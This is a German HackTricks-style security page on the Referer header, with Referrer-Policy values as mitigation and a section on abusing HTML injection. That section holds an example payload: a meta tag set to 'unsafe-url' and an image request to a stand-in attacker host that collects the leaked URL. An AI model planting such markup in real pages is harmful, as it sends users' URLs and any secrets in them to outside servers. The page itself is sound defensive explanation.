# Interessantes HTTP-Verhalten

{{#include ../banners/hacktricks-training.md}}

## `Referer`-Header und Referrer-Policy

Der HTTP-Request-Header `Referer` identifiziert die absolute oder teilweise URL, von der eine Ressource angefordert wurde. Abhängig von der aktiven Referrer-Policy kann er den verweisenden Origin, Pfad und Query-String enthalten, jedoch nicht das URL-Fragment.<sup>[[1]](#references)</sup>

### Leak sensibler Informationen

Secrets in URL-Pfaden oder Query-Parametern können über den Browserverlauf, Logs, Analytics, kopierte Links und den `Referer`-Header geleakt werden. Ein Cross-Origin-Link oder eine Subresource-Anfrage kann daher die verweisende URL an einen externen Server offenlegen.<sup>[[2]](#references)</sup>

### Mitigation

Verwende den Response-Header `Referrer-Policy`, um zu steuern, wie viele Referrer-Informationen der Browser sendet. `strict-origin-when-cross-origin` ist der moderne Standard in Browsern, während `no-referrer` den Header vollständig unterdrückt; wähle die Policy, die den Anforderungen der Anwendung entspricht.<sup>[[3]](#references)</sup>
```http
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
Platzieren Sie keine Passwörter, Sitzungskennungen, API-Schlüssel oder andere vertrauliche Werte in URLs. Senden Sie sie stattdessen über geeignete Request-Header oder Request-Bodies über TLS.<sup>[[2]](#references)</sup>

### Überlegung zu HTML Injection

Ein Dokument kann mit `<meta name="referrer">` auch eine Policy für die gesamte Seite festlegen. Wenn eine HTML-Injection-Schwachstelle es einem Angreifer ermöglicht, ein wirksames Meta-Element einzufügen, kann der Angreifer versuchen, die Policy des Dokuments für nachfolgende Requests zu schwächen. Dynamisch injizierte oder widersprüchliche Meta-Policies können sich unvorhersehbar verhalten. Überprüfen Sie daher das Verhalten im Zielbrowser, anstatt davon auszugehen, dass der Response-Header immer überschrieben wird.<sup>[[4]](#references)</sup>
```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.example/collect" alt="">
```
Behebe die zugrunde liegende HTML-Injection und halte sensible Daten aus der URL heraus; eine Referrer-Policy ist Defense in Depth und kein Ersatz für eine der beiden Maßnahmen.

## References

- [1] [MDN - `Referer`-Header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referer)
- [2] [MITRE CWE-598 - Verwendung der GET-Anfragemethode mit sensiblen Query-Strings](https://cwe.mitre.org/data/definitions/598.html)
- [3] [MDN - `Referrer-Policy`-Header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referrer-Policy)
- [4] [MDN - `<meta name="referrer">`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/meta/name/referrer)
{{#include ../banners/hacktricks-training.md}}
